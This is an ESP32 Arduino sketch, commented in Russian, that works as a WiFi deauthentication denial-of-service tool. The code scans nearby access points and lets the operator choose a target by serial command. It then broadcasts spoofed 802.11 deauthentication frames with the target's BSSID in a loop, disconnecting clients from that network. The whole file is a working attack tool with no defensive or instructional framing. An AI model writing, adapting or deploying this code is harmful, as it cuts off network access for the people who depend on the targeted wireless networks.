#include <WiFi.h>
#include <esp_wifi.h>

// Структура для хранения информации о точке доступа
struct AccessPoint {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

// Глобальные переменные
AccessPoint networks[50];
int networkCount = 0;
bool attackActive = false;
uint8_t targetBSSID[6] = {0};
int targetChannel = 0;
String targetSSID = "";

// Пакет деаутентификации (тип 0xC0 - Deauthentication)
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00,          // Frame Control (Deauth)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (заполняется BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (заполняется)
  0x00, 0x00,                         // Sequence
  0x01, 0x00                           // Reason code (1 = unspecified)
};

// 🔧 ПРОТОТИПЫ ФУНКЦИЙ (обязательно для PlatformIO)
void scanNetworks();
void sendDeauthPacket();

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Инициализация WiFi в режиме STA
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Включаем promiscuous режим для отправки сырых пакетов
  esp_wifi_set_promiscuous(true);
  delay(100);

  Serial.println("\n[#] ESP32 DoS s3");
  Serial.println("Commands: scan, set <num>, start, stop");
}
void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();

    if (cmd == "scan") {
      scanNetworks();
    }
    else if (cmd.startsWith("set ")) {
      int index = cmd.substring(4).toInt() - 1;
      if (index >= 0 && index < networkCount) {
        memcpy(targetBSSID, networks[index].bssid, 6);
        targetChannel = networks[index].channel;
        targetSSID = networks[index].ssid;
        Serial.println("Target set to: " + targetSSID);
        Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d\n",
                      targetBSSID[0], targetBSSID[1], targetBSSID[2],
                      targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel);
      } else {
        Serial.println("Invalid number.");
      }
    }
    else if (cmd == "start") {
      if (targetChannel != 0) {
        attackActive = true;
        Serial.println("Attack STARTED");
      } else {
        Serial.println("No target selected.");
      }
    }
    else if (cmd == "stop") {
      attackActive = false;
      Serial.println("Attack STOPPED");
    }
    else {
      Serial.println("Unknown command");
    }
  }

  if (attackActive) {
    sendDeauthPacket();
    delay(100);
  }
}

void scanNetworks() {
  Serial.println("Scanning...");
  
  // Временно отключаем promiscuous для сканирования
  esp_wifi_set_promiscuous(false);  delay(50);
  
  networkCount = WiFi.scanNetworks();
  
  if (networkCount == 0) {
    Serial.println("No networks found");
  } else {
    for (int i = 0; i < networkCount; i++) {
      networks[i].ssid = WiFi.SSID(i);
      memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
      networks[i].channel = WiFi.channel(i);
      networks[i].rssi = WiFi.RSSI(i);

      Serial.printf("%d: %s (%02X:%02X:%02X:%02X:%02X:%02X) ch %d\n",
                    i+1,
                    networks[i].ssid.c_str(),
                    networks[i].bssid[0], networks[i].bssid[1], networks[i].bssid[2],
                    networks[i].bssid[3], networks[i].bssid[4], networks[i].bssid[5],
                    networks[i].channel);
    }
  }
  WiFi.scanDelete();
  
  // Возвращаем promiscuous режим
  esp_wifi_set_promiscuous(true);
  delay(50);
}

void sendDeauthPacket() {
  if (targetChannel == 0) return;
  
  // Переключаемся на канал цели
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  
  // Заполняем MAC-адреса в пакете (Source и BSSID)
  memcpy(&deauthPacket[10], targetBSSID, 6);
  memcpy(&deauthPacket[16], targetBSSID, 6);
  
  // Отправляем пакет через STA интерфейс
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  
  // Небольшая задержка для стабильности
  delayMicroseconds(100);
}
